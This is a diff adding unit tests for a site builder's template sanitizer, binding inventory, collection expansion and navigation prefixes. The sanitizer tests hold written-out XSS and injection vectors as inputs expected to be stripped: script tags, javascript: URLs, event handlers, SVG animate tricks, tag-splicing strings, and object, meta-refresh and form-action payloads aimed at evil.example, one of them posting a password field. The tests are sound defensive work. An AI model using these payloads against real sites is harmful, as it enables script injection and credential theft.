@@ -7,11 +7,15 @@ import {
   renderTemplate,
   resolveStyles,
   safeUrl,
+  sanitizeTemplateMarkup,
   sanitizeRich,
   scopeCss,
   buildTemplateTree,
+  collectTemplateBindings,
+  expandTemplateCollections,
   parseAttrs,
   styleStringToObject,
+  templateRuntimeBindings,
   type TemplateNode,
 } from './template';
 
@@ -43,6 +47,118 @@ describe('escapeHtml', () => {
   });
 });
 
+describe('template markup sanitization', () => {
+  it('strips executable markup from an unsaved preview source', () => {
+    expect(
+      sanitizeTemplateMarkup(
+        '<section onclick="steal()"><script>alert(1)</script><iframe src="x"></iframe><a href="javascript:alert(1)">x</a></section>',
+      ),
+    ).toBe('<section><a>x</a></section>');
+  });
+
+  // The API rejects these on write, but this layer also renders rows saved
+  // before that rule, unsaved Studio drafts and headless input, so it has to
+  // remove them on its own.
+  it.each([
+    ['object', '<object data="https://evil.example/x.html" type="text/html"></object>'],
+    ['embed', '<embed src="https://evil.example/x.swf">'],
+    ['base', '<base href="https://evil.example/">'],
+    ['meta', '<meta http-equiv="refresh" content="0;url=https://evil.example">'],
+    ['link', '<link rel="stylesheet" href="https://evil.example/x.css">'],
+    ['style', '<style>body{background:url(https://evil.example/track)}</style>'],
+    ['applet', '<applet code="Evil.class"></applet>'],
+    ['frameset', '<frameset><frame src="https://evil.example/"></frameset>'],
+    ['template', '<template><p>hidden</p></template>'],
+    ['portal', '<portal src="https://evil.example/"></portal>'],
+  ])('removes <%s> and its content', (_tag, vector) => {
+    expect(sanitizeTemplateMarkup(`<p>before</p>${vector}<p>after</p>`)).toBe(
+      '<p>before</p><p>after</p>',
+    );
+  });
+
+  it('strips the submission target of a form instead of the form itself', () => {
+    expect(
+      sanitizeTemplateMarkup(
+        '<form action="https://evil.example/steal"><input name="p" type="password"></form>',
+      ),
+    ).toBe('<form><input name="p" type="password"></form>');
+    expect(
+      sanitizeTemplateMarkup(
+        '<button type="submit" formaction="https://evil.example/steal">x</button>',
+      ),
+    ).toBe('<button type="submit">x</button>');
+  });
+
+  it('removes the svg and mathml escape hatches', () => {
+    expect(
+      sanitizeTemplateMarkup(
+        '<svg><a href="/x"><animate attributeName="href" to="javascript&#58;alert(1)"></animate></a></svg>',
+      ),
+    ).toBe('<svg><a href="/x"></a></svg>');
+    expect(sanitizeTemplateMarkup('<svg><foreignObject><p>x</p></foreignObject></svg>')).toBe(
+      '<svg></svg>',
+    );
+    expect(
+      sanitizeTemplateMarkup('<svg><a><set attributeName="href" to="x"></set></a></svg>'),
+    ).toBe('<svg><a></a></svg>');
+  });
+
+  it('does not let a removed tag splice a new one out of its neighbours', () => {
+    expect(sanitizeTemplateMarkup('<obj<object>ect data="https://evil.example/x.html">')).toBe('');
+  });
+
+  it('neutralizes nesting deeper than the removal budget instead of rebuilding a tag', () => {
+    let vector = '<object data="x">';
+    for (let level = 0; level < 12; level += 1) {
+      vector = `<obj${vector}ect data="x">`;
+    }
+    expect(sanitizeTemplateMarkup(vector).toLowerCase()).not.toContain('<object');
+  });
+
+  it('keeps the markup the native blocks ship', () => {
+    const header =
+      '<label class="nv-theme-toggle-label" for="nv-theme-toggle">' +
+      '<input type="checkbox" id="nv-theme-toggle" class="nv-theme-toggle-input" />' +
+      '<span class="nv-theme-toggle-icon" aria-hidden="true"></span></label>';
+    const todo =
+      '<form class="nv-todo-create" data-nv-todo-form>' +
+      '<input id="nv-todo-title" type="text" placeholder="Add a task" required>' +
+      '<button class="nv-todo-add" type="submit">Add task</button></form>';
+    const content =
+      '<article><header><h2>Title</h2><time datetime="2026-01-01">Jan</time></header>' +
+      '<figure><img src="/a.png" alt=""><figcaption>Caption</figcaption></figure>' +
+      '<svg viewBox="0 0 16 16"><path d="M0 0h16v16H0z"></path></svg></article>';
+    expect(sanitizeTemplateMarkup(header)).toBe(header);
+    expect(sanitizeTemplateMarkup(todo)).toBe(todo);
+    expect(sanitizeTemplateMarkup(content)).toBe(content);
+  });
+
+  it('removes the same vectors through the full render pipeline', () => {
+    expect(
+      renderHtml(
+        '<section>' +
+          '<object data="https://evil.example/x.html" type="text/html"></object>' +
+          '<embed src="https://evil.example/x.swf">' +
+          '<base href="https://evil.example/">' +
+          '<meta http-equiv="refresh" content="0;url=https://evil.example">' +
+          '<link rel="stylesheet" href="https://evil.example/x.css">' +
+          '<style>body{background:url(https://evil.example/track)}</style>' +
+          '<form action="https://evil.example/steal"><input name="p" type="password"></form>' +
+          '<a href="/safe">ok</a>' +
+          '</section>',
+      ),
+    ).toBe(
+      '<section><form><input name="p" type="password"></form><a href="/safe">ok</a></section>',
+    );
+  });
+
+  it('cannot be reached through an interpolated prop value', () => {
+    expect(
+      renderHtml('<div>{{body}}</div>', { body: '<object data="https://evil.example/x.html">' }),
+    ).toBe('<div>&lt;object data=&quot;https://evil.example/x.html&quot;&gt;</div>');
+  });
+});
+
 describe('interpolate', () => {
   it('replaces {{key}} with the escaped value', () => {
     expect(interpolate('<h1>{{title}}</h1>', { title: 'Hi <b>' })).toBe('<h1>Hi &lt;b&gt;</h1>');
@@ -68,6 +184,47 @@ describe('interpolate', () => {
 
   it('stringifies numeric values', () => {
     expect(interpolate('<span>{{count}}</span>', { count: 3 })).toBe('<span>3</span>');
+  });
+});
+
+describe('template binding inventory', () => {
+  it('collects interpolation, binding attributes and slots from real source', () => {
+    expect(
+      collectTemplateBindings(
+        '<section class="hero-{{variant}}"><h1 data-nv-text="title">Title</h1><img data-nv-image="image" data-nv-alt="title"><div data-nv-slot="content"></div></section>',
+      ),
+    ).toEqual({ props: ['variant', 'title', 'image'], slots: ['content'] });
+  });
+
+  it('does not report local collection item values as Block fields', () => {
+    expect(
+      collectTemplateBindings(
+        '<section><h2>{{heading}}</h2>{{#each entries}}<article>{{title}}</article>{{/each}}</section>',
+      ),
+    ).toEqual({ props: ['heading'], slots: [] });
+  });
+
+  it('collects and resolves declared collection runtime configuration', () => {
+    const html =
+      '<section data-nv-runtime="object-records" data-nv-runtime-object-definition="tasksObject" data-nv-runtime-title-field="taskName"></section>';
+    expect(collectTemplateBindings(html)).toEqual({
+      props: ['tasksObject', 'taskName'],
+      slots: [],
+    });
+    expect(templateRuntimeBindings(html)).toEqual({
+      objectDefinition: 'tasksObject',
+      titleField: 'taskName',
+    });
+  });
+});
+
+describe('collection templates', () => {
+  it('expands each regions with escaped item values before normal rendering', () => {
+    expect(
+      expandTemplateCollections('<ul>{{#each entries}}<li>{{title}}</li>{{/each}}</ul>', {
+        entries: [{ title: 'Safe <article>' }, { title: 'Second' }],
+      }),
+    ).toBe('<ul><li>Safe &lt;article&gt;</li><li>Second</li></ul>');
   });
 });
 
@@ -123,6 +280,23 @@ describe('data-nv-text binding', () => {
 
   it('keeps the binding attribute for studio inline editing', () => {
     expect(renderHtml('<span data-nv-text="x">y</span>', { x: 'z' })).toContain('data-nv-text="x"');
+  });
+});
+
+describe('data-nv-tag binding', () => {
+  it('changes an allowed semantic tag through the template engine', () => {
+    expect(
+      renderHtml('<h2 data-nv-tag="level" data-nv-text="title">Default</h2>', {
+        level: 'h1',
+        title: 'Heading',
+      }),
+    ).toBe('<h1 data-nv-tag="level" data-nv-text="title">Heading</h1>');
+  });
+
+  it('keeps the authored tag for an invalid value', () => {
+    expect(renderHtml('<h2 data-nv-tag="level">Default</h2>', { level: 'script' })).toBe(
+      '<h2 data-nv-tag="level">Default</h2>',
+    );
   });
 });
 
@@ -282,6 +456,18 @@ describe('renderNavList', () => {
   it('renders nothing (not the placeholder) when given undefined', () => {
     expect(renderNavList(undefined)).toBe('');
   });
+
+  it('prefixes links for a secondary site', () => {
+    expect(
+      renderNavList(
+        [
+          { title: 'Home', path: '/' },
+          { title: 'Blog', path: '/blog' },
+        ],
+        '/s/docs',
+      ),
+    ).toBe('<a href="/s/docs">Home</a><a href="/s/docs/blog">Blog</a>');
+  });
 });
 
 describe('data-nv-nav binding', () => {
@@ -310,6 +496,17 @@ describe('data-nv-nav binding', () => {
   it('renders an empty nav when the site has no published pages yet', () => {
     const { nodes } = renderTemplate({ html, erc: 'nv-header', props: {}, sitePages: [] });
     expect((nodes[0] as { html: string }).html).toBe('<nav data-nv-nav="pages"></nav>');
+  });
+
+  it('uses the secondary-site prefix for generated links', () => {
+    const { nodes } = renderTemplate({
+      html,
+      erc: 'nv-header',
+      props: {},
+      sitePages: [{ title: 'Blog', path: '/blog' }],
+      siteBasePath: '/s/docs',
+    });
+    expect((nodes[0] as { html: string }).html).toContain('href="/s/docs/blog"');
   });
 });
 
